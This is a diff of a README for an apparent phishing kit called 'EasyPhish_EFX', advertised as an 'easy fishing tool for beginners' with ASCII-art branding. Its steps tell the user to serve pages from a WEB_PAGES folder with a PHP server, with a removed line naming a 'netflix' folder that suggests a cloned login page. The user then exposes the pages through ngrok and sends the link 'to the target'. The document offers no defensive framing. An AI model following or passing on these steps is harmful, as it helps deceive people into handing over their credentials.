@@ -1,5 +1,24 @@
-This will be tutorial to use thse files.
-1 have to activate the ngrok server to do that follow 
-./ngrok http 1354 (enable hotspot before using this in mobile)
-cd netflix
-php -S localhost:3468
+| ____|__ _ ___ _   _  |  _ \| | | |_ _/ ___|| |__   | ____|  ___\ \/ /
+|  _| / _` / __| | | | | |_) | |_| || |\___ \| '_ \  |  _| | |_   \  /
+| |__| (_| \__ \ |_| | |  __/|  _  || | ___) | | | | | |___|  _|  /  \
+|_____\__,_|___/\__, | |_|   |_| |_|___|____/|_| |_| |_____|_|   /_/\_\
+best and easy fishing tool for beginners
+By:
+ _____ _______  __  _____
+| ____|  ___\ \/ / |_   _|_   __
+|  _| | |_   \  /    | | \ \ / /
+| |___|  _|  /  \    | |  \ V /
+|_____|_|   /_/\_\   |_|   \_/
+
+Please subscribe us and share this tool with others.
+
+Step 1 - run the PHP server in any folder under WEB_PAGES you want to host on the localhost.
+Use command 
+(php -S localhost:3468)
+
+Step 2 - If you want to locate the server over the internet simply open new terminal or session in Termux and run following command 
+(./ngrok http 1354) (enable hotspot before using this in mobile)
+
+Step 3 - Share the link with the target followed by .io.
+
+For more visit our youtube channel and watch the EasyPhish_EFX best and easy fishing tool for beginners
